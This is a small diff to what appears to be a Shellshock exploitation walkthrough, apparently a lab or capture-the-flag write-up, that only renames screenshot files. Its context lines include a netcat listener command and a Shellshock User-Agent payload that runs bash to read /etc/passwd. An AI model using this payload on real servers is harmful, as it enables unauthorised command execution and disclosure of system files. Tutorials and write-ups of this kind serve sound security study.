@@ -97,7 +97,7 @@ nc -lvnp 4444
 ![Burp Intercept](screenshots/burp-intercept.webp)
 
 ### Step 2: Inject Payload
-![Exploitation](screenshots/screenshot2.webp)
+![Exploitation](screenshots/payload.webp)
 
 Modify the User-Agent header:
 ```http
@@ -105,7 +105,7 @@ User-Agent: () { :;}; echo; /bin/bash -c 'cat /etc/passwd'
 ```
 
 ### Step 3: Observe Response
-![Reverse Shell](screenshots/screenshot3.webp)
+![Reverse Shell](screenshots/result.webp)
 
 The server executes your command and returns the output.
 
